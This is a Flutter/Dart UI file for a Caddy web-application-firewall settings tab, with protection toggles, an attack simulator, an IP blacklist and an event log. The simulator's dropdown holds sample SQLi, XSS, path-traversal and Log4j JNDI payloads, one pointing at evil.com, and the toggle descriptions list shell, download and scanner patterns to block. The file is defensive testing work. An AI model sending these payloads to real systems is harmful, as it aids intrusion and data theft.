part of '../caddy_page.dart';

extension _CaddyWafExt on _CaddyPageState {
  // --- TAB 8: WAF & Threat Shield ---
  Widget _buildWAFTab(ThemeData theme, bool isDark) {
    final enabled = _wafConfig['enabled'] == true;
    final mode = _wafConfig['mode'] ?? 'enforce';
    final paranoia = (_wafConfig['paranoia_level'] as num?)?.toInt() ?? 1;
    final requestsEval = _wafStats['total_requests_evaluated'] ?? _wafConfig['total_requests_evaluated'] ?? 0;
    final blockedAttacks = _wafStats['total_blocked_attacks'] ?? _wafConfig['total_blocked_attacks'] ?? 0;
    final activeRoutes = _wafStats['active_waf_routes_count'] ?? 0;
    final blacklistedCount = _wafStats['blacklisted_ips_count'] ?? 0;

    final blockSQLi = _wafConfig['block_sqli'] ?? true;
    final blockXSS = _wafConfig['block_xss'] ?? true;
    final blockRCE = _wafConfig['block_rce'] ?? true;
    final blockLFI = _wafConfig['block_lfi'] ?? true;
    final blockScanners = _wafConfig['block_scanners'] ?? true;

    final blacklistedIPs = (_wafConfig['blacklisted_ips'] ?? '').toString().split(',').where((s) => s.trim().isNotEmpty).toList();

    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          // Master Switch Card
          Card(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Icon(
                        enabled ? Icons.security : Icons.shield_outlined,
                        size: 32,
                        color: enabled ? (mode == 'detection' ? Colors.amber : Colors.green) : Colors.grey,
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Text(
                                  'Caddy Ingress Threat Shield & Web Application Firewall (WAF)',
                                  style: theme.textTheme.titleMedium?.copyWith(fontWeight: FontWeight.bold),
                                ),
                                const SizedBox(width: 10),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 3),
                                  decoration: BoxDecoration(
                                    color: enabled
                                        ? (mode == 'detection' ? Colors.amber.withValues(alpha: 0.2) : Colors.green.withValues(alpha: 0.2))
                                        : Colors.red.withValues(alpha: 0.2),
                                    borderRadius: BorderRadius.circular(12),
                                    border: Border.all(
                                      color: enabled ? (mode == 'detection' ? Colors.amber : Colors.green) : Colors.red,
                                    ),
                                  ),
                                  child: Text(
                                    enabled ? (mode == 'detection' ? '🟡 DETECTION ONLY' : '🟢 ACTIVE (ENFORCING)') : '🔴 DISABLED',
                                    style: TextStyle(
                                      fontSize: 11,
                                      fontWeight: FontWeight.bold,
                                      color: enabled ? (mode == 'detection' ? Colors.amber : Colors.green) : Colors.red,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            const SizedBox(height: 4),
                            Text(
                              'Air-gapped Layer 7 threat defense built natively into Caddy Ingress. Supports manual override ("a mano") and Compose labels.',
                              style: theme.textTheme.bodySmall?.copyWith(color: theme.colorScheme.onSurface.withValues(alpha: 0.6)),
                            ),
                          ],
                        ),
                      ),
                      Switch(
                        value: enabled,
                        activeThumbColor: const Color(0xFFF97316),
                        onChanged: (val) {
                          _updateState(() {
                            _wafConfig['enabled'] = val;
                          });
                        },
                      ),
                    ],
                  ),
                  const Divider(height: 28),
                  Row(
                    children: [
                      const Text('Operating Mode: ', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                      const SizedBox(width: 8),
                      DropdownButton<String>(
                        value: mode == 'detection' ? 'detection' : 'enforce',
                        isDense: true,
                        items: const [
                          DropdownMenuItem(value: 'enforce', child: Text('Enforcing (Block attacks with 403 Forbidden)')),
                          DropdownMenuItem(value: 'detection', child: Text('Detection (Pass traffic & log threat headers)')),
                        ],
                        onChanged: (val) {
                          if (val != null) {
                            _updateState(() => _wafConfig['mode'] = val);
                          }
                        },
                      ),
                      const SizedBox(width: 24),
                      const Text('Paranoia Level: ', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                      const SizedBox(width: 8),
                      DropdownButton<int>(
                        value: paranoia >= 1 && paranoia <= 4 ? paranoia : 1,
                        isDense: true,
                        items: const [
                          DropdownMenuItem(value: 1, child: Text('Level 1 (Recommended - Low False Positives)')),
                          DropdownMenuItem(value: 2, child: Text('Level 2 (Advanced Security)')),
                          DropdownMenuItem(value: 3, child: Text('Level 3 (Strict Corporate)')),
                          DropdownMenuItem(value: 4, child: Text('Level 4 (Paranoid / Zero-Trust)')),
                        ],
                        onChanged: (val) {
                          if (val != null) {
                            _updateState(() => _wafConfig['paranoia_level'] = val);
                          }
                        },
                      ),
                      const Spacer(),
                      FilledButton.icon(
                        style: FilledButton.styleFrom(backgroundColor: const Color(0xFFF97316)),
                        icon: _wafSaving
                            ? const SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white))
                            : const Icon(Icons.save, size: 16),
                        label: const Text('Save Threat Shield Config'),
                        onPressed: _wafSaving ? null : _saveWAFConfig,
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
          const SizedBox(height: 14),

          // 4 Security KPI Cards
          Row(
            children: [
              Expanded(child: _metricCard('Requests Evaluated', '$requestsEval', Icons.policy, Colors.blue, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Attacks Intercepted', '$blockedAttacks', Icons.gpp_bad, Colors.red, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Protected Routes', '$activeRoutes', Icons.fork_right, Colors.green, theme)),
              const SizedBox(width: 12),
              Expanded(child: _metricCard('Blacklisted IPs', '$blacklistedCount', Icons.block, Colors.purple, theme)),
            ],
          ),
          const SizedBox(height: 14),

          // Threat Vectors & IP Blacklist Row
          Row(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              // Attack Vector Toggles
              Expanded(
                flex: 3,
                child: Card(
                  child: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            const Icon(Icons.tune, size: 20, color: Color(0xFFF97316)),
                            const SizedBox(width: 8),
                            Text('Core Protection Vectors (OWASP Top 10)', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                          ],
                        ),
                        const SizedBox(height: 14),
                        _wafVectorTile(
                          'SQL Injection (SQLi)',
                          'Blocks UNION SELECT, sleep, benchmark, information_schema, SQL comment injection',
                          blockSQLi,
                          (v) => _updateState(() => _wafConfig['block_sqli'] = v),
                        ),
                        _wafVectorTile(
                          'Cross-Site Scripting (XSS)',
                          'Blocks <script>, javascript: URI, onerror, document.cookie, malicious HTML tags',
                          blockXSS,
                          (v) => _updateState(() => _wafConfig['block_xss'] = v),
                        ),
                        _wafVectorTile(
                          'Remote Code Execution (RCE & Log4j)',
                          'Blocks \${jndi:ldap}, /bin/sh, /bin/bash, powershell, cmd.exe, wget/curl payload injection',
                          blockRCE,
                          (v) => _updateState(() => _wafConfig['block_rce'] = v),
                        ),
                        _wafVectorTile(
                          'Path Traversal & LFI / RFI',
                          'Blocks directory traversal (../, ..\\), /etc/passwd, /proc/self, win.ini, boot.ini',
                          blockLFI,
                          (v) => _updateState(() => _wafConfig['block_lfi'] = v),
                        ),
                        _wafVectorTile(
                          'Malicious Scanners & Bot Probes',
                          'Detects & terminates sqlmap, nikto, w3af, masscan, nmap, gobuster, dirbuster, wpscan',
                          blockScanners,
                          (v) => _updateState(() => _wafConfig['block_scanners'] = v),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(width: 14),

              // Interactive Penetration Test & Simulator
              Expanded(
                flex: 2,
                child: Card(
                  child: Padding(
                    padding: const EdgeInsets.all(20),
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Row(
                          children: [
                            const Icon(Icons.science, size: 20, color: Color(0xFFF97316)),
                            const SizedBox(width: 8),
                            Text('Threat Shield Attack Simulator', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Text(
                          'Simulate live attack probes against any ingress route to verify Threat Shield interception.',
                          style: theme.textTheme.bodySmall?.copyWith(color: theme.colorScheme.onSurface.withValues(alpha: 0.6)),
                        ),
                        const SizedBox(height: 14),
                        const Text('Target Route:', style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 4),
                        TextField(
                          decoration: InputDecoration(
                            hintText: _routesList.isNotEmpty ? _routesList.first['host'] ?? 'app.gbnt.local' : 'app.gbnt.local',
                            prefixIcon: const Icon(Icons.link, size: 18),
                            isDense: true,
                          ),
                          onChanged: (val) => _wafSimulateHost = val.trim(),
                        ),
                        const SizedBox(height: 12),
                        const Text('Attack Vector to Simulate:', style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                        const SizedBox(height: 4),
                        DropdownButtonFormField<String>(
                          initialValue: _wafSimulateVector,
                          decoration: const InputDecoration(isDense: true),
                          items: const [
                            DropdownMenuItem(value: 'SQLI', child: Text('SQLi: ?id=1+UNION+SELECT+1,2,3--')),
                            DropdownMenuItem(value: 'XSS', child: Text('XSS: ?q=<script>alert(1)</script>')),
                            DropdownMenuItem(value: 'RCE', child: Text('RCE: ?cmd=\${jndi:ldap://evil.com}')),
                            DropdownMenuItem(value: 'LFI', child: Text('LFI: ?file=../../../../etc/passwd')),
                            DropdownMenuItem(value: 'SCANNER', child: Text('SCANNER: User-Agent: sqlmap/1.8')),
                          ],
                          onChanged: (val) {
                            if (val != null) _updateState(() => _wafSimulateVector = val);
                          },
                        ),
                        const SizedBox(height: 16),
                        SizedBox(
                          width: double.infinity,
                          child: FilledButton.icon(
                            style: FilledButton.styleFrom(backgroundColor: const Color(0xFFF97316)),
                            icon: const Icon(Icons.bolt, size: 18),
                            label: const Text('Launch Attack Probe'),
                            onPressed: _runWAFSimulation,
                          ),
                        ),
                        const SizedBox(height: 16),
                        // IP Blacklist Quick Action
                        const Divider(),
                        Row(
                          children: [
                            const Icon(Icons.block, size: 18, color: Colors.purple),
                            const SizedBox(width: 8),
                            const Text('Threat Shield Blacklist', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 13)),
                            const Spacer(),
                            IconButton(
                              icon: const Icon(Icons.add_circle, size: 20, color: Color(0xFFF97316)),
                              tooltip: 'Add IP to Blacklist',
                              onPressed: _showAddBlacklistIPDialog,
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        if (blacklistedIPs.isEmpty)
                          const Text('No IPs blacklisted.', style: TextStyle(fontSize: 12, color: Colors.grey))
                        else
                          Wrap(
                            spacing: 8,
                            runSpacing: 6,
                            children: blacklistedIPs.map((ip) {
                              return Chip(
                                label: Text(ip, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New')),
                                deleteIcon: const Icon(Icons.close, size: 14),
                                onDeleted: () async {
                                  await ApiService.unblockWAFIP(ip);
                                  _showSnackBar('IP $ip removed from blacklist');
                                  await _loadCaddyData();
                                },
                              );
                            }).toList(),
                          ),
                      ],
                    ),
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 14),

          // Intercepted Security Events Stream Card
          Card(
            child: Padding(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      const Icon(Icons.receipt_long, size: 20, color: Color(0xFFF97316)),
                      const SizedBox(width: 8),
                      Text('Intercepted Threat Events & SIEM Audit Stream', style: theme.textTheme.titleSmall?.copyWith(fontWeight: FontWeight.bold)),
                      const Spacer(),
                      const Text('Filter: ', style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
                      const SizedBox(width: 6),
                      DropdownButton<String>(
                        value: _wafEventFilter,
                        isDense: true,
                        items: const [
                          DropdownMenuItem(value: 'ALL', child: Text('All Attacks')),
                          DropdownMenuItem(value: 'SQLI', child: Text('SQL Injection')),
                          DropdownMenuItem(value: 'XSS', child: Text('XSS')),
                          DropdownMenuItem(value: 'RCE', child: Text('RCE')),
                          DropdownMenuItem(value: 'LFI', child: Text('LFI / Traversal')),
                          DropdownMenuItem(value: 'SCANNER', child: Text('Scanners / Bots')),
                          DropdownMenuItem(value: 'IP_BLOCK', child: Text('IP Blocks')),
                        ],
                        onChanged: (val) {
                          if (val != null) {
                            _updateState(() => _wafEventFilter = val);
                            _loadCaddyData();
                          }
                        },
                      ),
                      const SizedBox(width: 12),
                      IconButton(
                        icon: const Icon(Icons.refresh, size: 18),
                        tooltip: 'Refresh event stream',
                        onPressed: _loadCaddyData,
                      ),
                    ],
                  ),
                  const SizedBox(height: 14),
                  if (_wafEvents.isEmpty)
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(24),
                      alignment: Alignment.center,
                      child: const Text('No security events recorded yet. Run an attack probe above to test!', style: TextStyle(color: Colors.grey)),
                    )
                  else
                    SingleChildScrollView(
                      scrollDirection: Axis.horizontal,
                      child: DataTable(
                        columns: const [
                          DataColumn(label: Text('TIMESTAMP')),
                          DataColumn(label: Text('CLIENT IP')),
                          DataColumn(label: Text('TARGET HOST / URI')),
                          DataColumn(label: Text('ATTACK TYPE')),
                          DataColumn(label: Text('RULE ID')),
                          DataColumn(label: Text('ACTION')),
                          DataColumn(label: Text('DETAILS')),
                        ],
                        rows: _wafEvents.map((e) {
                          final ts = (e['timestamp'] ?? '').toString().replaceAll('T', ' ').split('.').first;
                          final clientIP = e['client_ip'] ?? '-';
                          final host = e['host'] ?? '-';
                          final uri = e['uri'] ?? '/';
                          final attack = e['attack_type'] ?? '-';
                          final rule = e['rule_id'] ?? '-';
                          final action = e['action'] ?? 'BLOCKED';
                          final details = e['details'] ?? '-';

                          return DataRow(cells: [
                            DataCell(Text(ts, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New'))),
                            DataCell(Text(clientIP, style: const TextStyle(fontSize: 11, fontFamily: 'Courier New'))),
                            DataCell(Text('$host$uri', style: const TextStyle(fontSize: 11, fontFamily: 'Courier New', fontWeight: FontWeight.bold))),
                            DataCell(Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: Colors.orange.withValues(alpha: 0.15),
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(color: Colors.orange.withValues(alpha: 0.4)),
                              ),
                              child: Text(attack, style: const TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: Colors.orange)),
                            )),
                            DataCell(Text(rule, style: const TextStyle(fontSize: 11, fontWeight: FontWeight.bold))),
                            DataCell(Container(
                              padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2),
                              decoration: BoxDecoration(
                                color: action == 'BLOCKED' ? Colors.red.withValues(alpha: 0.15) : Colors.amber.withValues(alpha: 0.15),
                                borderRadius: BorderRadius.circular(4),
                                border: Border.all(color: action == 'BLOCKED' ? Colors.red : Colors.amber),
                              ),
                              child: Text(action, style: TextStyle(fontSize: 10, fontWeight: FontWeight.bold, color: action == 'BLOCKED' ? Colors.red : Colors.amber)),
                            )),
                            DataCell(Text(details, style: const TextStyle(fontSize: 11))),
                          ]);
                        }).toList(),
                      ),
                    ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _wafVectorTile(String title, String subtitle, bool value, ValueChanged<bool> onChanged) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 12),
      child: Row(
        children: [
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(fontSize: 13, fontWeight: FontWeight.bold)),
                const SizedBox(height: 2),
                Text(subtitle, style: const TextStyle(fontSize: 11, color: Colors.grey)),
              ],
            ),
          ),
          Switch(
            value: value,
            activeThumbColor: const Color(0xFFF97316),
            onChanged: onChanged,
          ),
        ],
      ),
    );
  }

  Future<void> _saveWAFConfig() async {
    _updateState(() => _wafSaving = true);
    try {
      final res = await ApiService.updateWAFConfig(_wafConfig);
      _showSnackBar(res['message'] ?? 'Threat Shield configuration updated!');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('Failed to update WAF: $e');
    } finally {
      if (mounted) _updateState(() => _wafSaving = false);
    }
  }

  Future<void> _runWAFSimulation() async {
    final host = _wafSimulateHost.isNotEmpty
        ? _wafSimulateHost
        : (_routesList.isNotEmpty ? _routesList.first['host'] ?? 'app.gbnt.local' : 'app.gbnt.local');
    try {
      final res = await ApiService.simulateWAFThreat(host, _wafSimulateVector);
      final evt = res['event'] ?? {};
      final action = evt['action'] ?? 'BLOCKED';
      final rule = evt['rule_id'] ?? 'WAF00X';
      _showSnackBar('🛡️ Probe result: $action by $rule (${evt['details']})');
      await _loadCaddyData();
    } catch (e) {
      _showSnackBar('Probe error: $e');
    }
  }

  void _showAddBlacklistIPDialog() {
    final ipCtrl = TextEditingController();
    final reasonCtrl = TextEditingController(text: 'Manual UI block');
    showDialog(
      context: context,
      builder: (ctx) => AlertDialog(
        title: const Row(
          children: [
            Icon(Icons.block, color: Colors.red),
            SizedBox(width: 8),
            Text('Add IP to Threat Shield Blacklist'),
          ],
        ),
        content: SizedBox(
          width: 400,
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                controller: ipCtrl,
                decoration: const InputDecoration(
                  labelText: 'IP Address or CIDR (e.g. 198.51.100.4 or 198.51.100.0/24)',
                  prefixIcon: Icon(Icons.network_check),
                  isDense: true,
                ),
              ),
              const SizedBox(height: 12),
              TextField(
                controller: reasonCtrl,
                decoration: const InputDecoration(
                  labelText: 'Reason for blocking',
                  prefixIcon: Icon(Icons.notes),
                  isDense: true,
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Cancel')),
          FilledButton.icon(
            style: FilledButton.styleFrom(backgroundColor: Colors.red),
            icon: const Icon(Icons.block, size: 16),
            label: const Text('Block IP'),
            onPressed: () async {
              final ip = ipCtrl.text.trim();
              final reason = reasonCtrl.text.trim();
              if (ip.isEmpty) return;
              Navigator.pop(ctx);
              await ApiService.blockWAFIP(ip, reason);
              _showSnackBar('IP $ip added to blacklist');
              await _loadCaddyData();
            },
          ),
        ],
      ),
    );
  }
}
